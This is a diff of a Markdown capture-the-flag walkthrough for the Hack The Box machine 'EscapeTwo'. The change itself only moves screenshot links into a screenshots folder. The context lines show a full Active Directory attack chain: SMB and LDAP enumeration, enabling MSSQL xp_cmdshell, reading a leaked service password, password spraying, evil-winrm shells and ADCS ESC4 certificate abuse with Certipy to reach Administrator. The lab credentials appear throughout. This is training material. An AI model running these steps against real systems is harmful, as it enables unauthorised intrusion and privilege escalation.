@@ -46,7 +46,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.232.128
 ```
 
-![ping](escapetwo_01_ping.png)
+![ping](screenshots/escapetwo_01_ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -58,8 +58,8 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.232.128 -oG allPorts
 extractPorts allPorts
 ```
 
-![nmap all ports](escapetwo_02_nmap_allports.png)
-![extractPorts](escapetwo_03_extractports.png)
+![nmap all ports](screenshots/escapetwo_02_nmap_allports.png)
+![extractPorts](screenshots/escapetwo_03_extractports.png)
 
 Open ports:
 
@@ -75,8 +75,8 @@ nmap -sCV -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,496
 cat targeted
 ```
 
-![targeted 1](escapetwo_04_nmap_targeted_1.png)
-![targeted 2](escapetwo_05_nmap_targeted_2.png)
+![targeted 1](screenshots/escapetwo_04_nmap_targeted_1.png)
+![targeted 2](screenshots/escapetwo_05_nmap_targeted_2.png)
 
 Key findings:
 - Domain: `sequel.htb`
@@ -93,7 +93,7 @@ Anonymous **LDAP** on **389/tcp** confirms the **DN** of the forest (useful befo
 ldapsearch -x -H ldap://10.129.232.128 -s base -b "" namingContexts
 ```
 
-![ldap-rootdse](escapetwo_06_ldap_rootdse_namingcontexts.png)
+![ldap-rootdse](screenshots/escapetwo_06_ldap_rootdse_namingcontexts.png)
 
 ---
 ## 2. Service Enumeration
@@ -108,9 +108,9 @@ smbclient -L //10.129.232.128 -N
 smbmap -u 'guest' -p '' -H 10.129.232.128
 ```
 
-![cme-smb-null](escapetwo_07_cme_smb_null.png)
-![smbclient-null-list](escapetwo_08_smbclient_null_list.png)
-![smbmap-guest](escapetwo_09_smbmap_guest.png)
+![cme-smb-null](screenshots/escapetwo_07_cme_smb_null.png)
+![smbclient-null-list](screenshots/escapetwo_08_smbclient_null_list.png)
+![smbmap-guest](screenshots/escapetwo_09_smbmap_guest.png)
 
 Additional null-session probes (anonymous login may succeed while **listing shares** or **paths** still fails):
 
@@ -123,9 +123,9 @@ crackmapexec smb 10.129.232.128 -u '' -p '' --shares
 rpcclient -U '' -N 10.129.232.128 -c 'netshareenumall'
 ```
 
-![smbclient-anon-share-probes](escapetwo_10_smbclient_anon_share_probes.png)
-![cme-null-shares](escapetwo_11_cme_null_shares_enum.png)
-![rpcclient-netshareenum-anon](escapetwo_12_rpcclient_netshareenumall_anon.png)
+![smbclient-anon-share-probes](screenshots/escapetwo_10_smbclient_anon_share_probes.png)
+![cme-null-shares](screenshots/escapetwo_11_cme_null_shares_enum.png)
+![rpcclient-netshareenum-anon](screenshots/escapetwo_12_rpcclient_netshareenumall_anon.png)
 
 With provided credentials `rose:KxEPkKe6R8su`, share enumeration succeeds:
 
@@ -133,7 +133,7 @@ With provided credentials `rose:KxEPkKe6R8su`, share enumeration succeeds:
 crackmapexec smb 10.129.232.128 -u rose -p 'KxEPkKe6R8su' --shares
 ```
 
-![rose-shares](escapetwo_13_cme_rose_shares.png)
+![rose-shares](screenshots/escapetwo_13_cme_rose_shares.png)
 
 Interesting shares include **`Users`** and **`Accounting Department`** (among others).
 
@@ -146,7 +146,7 @@ With **`rose`**, the **`Users`** share is readable; browsing confirms SMB access
 smbclient //10.129.232.128/Users -U 'rose' -p 'KxEPkKe6R8su'
 ```
 
-![users-share-rose](escapetwo_14_smbclient_users_share_rose.png)
+![users-share-rose](screenshots/escapetwo_14_smbclient_users_share_rose.png)
 
 ---
 ### 2.3 Corrupted Excel recovery
@@ -159,7 +159,7 @@ smbclient //10.129.232.128/Accounting\ Department -U 'rose' -p 'KxEPkKe6R8su'
 # get accounting_2024.xlsx
 ```
 
-![accounting-share-files](escapetwo_15_accounting_department_files.png)
+![accounting-share-files](screenshots/escapetwo_15_accounting_department_files.png)
 
 `accounts.xlsx` is corrupted but recoverable:
 
@@ -169,8 +169,8 @@ sed -n '1,120p' accounts_unpacked/xl/worksheets/sheet1.xml
 sed -n '1,80p' accounts_unpacked/xl/sharedStrings.xml
 ```
 
-![accounts-7z-extract](escapetwo_16_accounts_xlsx_7z_extract.png)
-![accounts-xml-creds](escapetwo_17_accounts_xml_credentials.png)
+![accounts-7z-extract](screenshots/escapetwo_16_accounts_xlsx_7z_extract.png)
+![accounts-xml-creds](screenshots/escapetwo_17_accounts_xml_credentials.png)
 
 Recovered credentials:
 
@@ -196,7 +196,7 @@ rpcclient -U 'sequel\oscar' //10.129.232.128
 # enumdomgroups
 ```
 
-![rpcclient-enumdomusers-users-txt](escapetwo_18_rpcclient_enumdomusers_users_txt.png)
+![rpcclient-enumdomusers-users-txt](screenshots/escapetwo_18_rpcclient_enumdomusers_users_txt.png)
 
 Build **`users.txt`** with one username per line: merge **spreadsheet + HTB `rose`** with **`enumdomusers`** results (you can skip built-ins like **Guest** / **krbtgt** if you want a shorter list). Example:
 
@@ -234,7 +234,7 @@ RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
 ```
 
-![mssql-xp-cmdshell-whoami](escapetwo_19_mssql_xp_cmdshell_whoami.png)
+![mssql-xp-cmdshell-whoami](screenshots/escapetwo_19_mssql_xp_cmdshell_whoami.png)
 
 Execution context:
 - `sequel\sql_svc`
@@ -245,7 +245,7 @@ Read SQL setup configuration:
 EXEC xp_cmdshell 'type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI';
 ```
 
-![mssql-sql-configuration-ini](escapetwo_20_mssql_sql_configuration_ini.png)
+![mssql-sql-configuration-ini](screenshots/escapetwo_20_mssql_sql_configuration_ini.png)
 
 Important leak:
 - `SQLSVCPASSWORD="WqSZAF6CysDQbGb3"` (install-time password for **`SEQUEL\sql_svc`**; also reused elsewhereâ€”see WinRM below)
@@ -257,7 +257,7 @@ crackmapexec smb 10.129.232.128 -u users.txt -p 'WqSZAF6CysDQbGb3' --continue-on
 crackmapexec winrm 10.129.232.128 -u users.txt -p 'WqSZAF6CysDQbGb3' --continue-on-success
 ```
 
-![crackmapexec-spray-winrm-ryan](escapetwo_21_crackmapexec_spray_winrm_ryan.png)
+![crackmapexec-spray-winrm-ryan](screenshots/escapetwo_21_crackmapexec_spray_winrm_ryan.png)
 
 Expect **WinRM** success for **`ryan`** (SMB may still fail for that pair depending on rights). Shell:
 
@@ -269,7 +269,7 @@ evil-winrm -i 10.129.232.128 -u ryan -p 'WqSZAF6CysDQbGb3'
 # cat user.txt
 ```
 
-![user-txt](escapetwo_22_user_txt.png)
+![user-txt](screenshots/escapetwo_22_user_txt.png)
 
 ðŸ **User flag obtained**
 
@@ -299,7 +299,7 @@ Validate:
 crackmapexec smb 10.129.232.128 -u ca_svc -p 'TempPass2026!'
 ```
 
-![cme-ca-svc-validate](escapetwo_23_cme_ca_svc_smb_validate.png)
+![cme-ca-svc-validate](screenshots/escapetwo_23_cme_ca_svc_smb_validate.png)
 
 ---
 ### 4.2 ADCS template abuse with Certipy
@@ -310,7 +310,7 @@ Enumerate templates:
 certipy-ad find -u 'ca_svc@sequel.htb' -p 'TempPass2026!' -dc-ip 10.129.232.128 -stdout
 ```
 
-![certipy-find-templates](escapetwo_24_certipy_find_templates.png)
+![certipy-find-templates](screenshots/escapetwo_24_certipy_find_templates.png)
 
 Target template:
 - `DunderMifflinAuthentication` (`ESC4`)
@@ -339,7 +339,7 @@ certipy-ad req \
   -dc-ip 10.129.232.128
 ```
 
-![certipy-req-administrator-pfx](escapetwo_25_certipy_req_administrator_pfx.png)
+![certipy-req-administrator-pfx](screenshots/escapetwo_25_certipy_req_administrator_pfx.png)
 
 Authenticate with generated PFX:
 
@@ -347,7 +347,7 @@ Authenticate with generated PFX:
 certipy-ad auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.129.232.128
 ```
 
-![certipy-auth-administrator-hash](escapetwo_26_certipy_auth_administrator_hash.png)
+![certipy-auth-administrator-hash](screenshots/escapetwo_26_certipy_auth_administrator_hash.png)
 
 Use returned Administrator hash:
 
@@ -355,7 +355,7 @@ Use returned Administrator hash:
 evil-winrm -i 10.129.232.128 -u Administrator -H '<NT_HASH>'
 ```
 
-![root-txt](escapetwo_27_evil_winrm_root_txt.png)
+![root-txt](screenshots/escapetwo_27_evil_winrm_root_txt.png)
 
 Retrieve root flag from:
 - `C:\Users\Administrator\Desktop\root.txt`
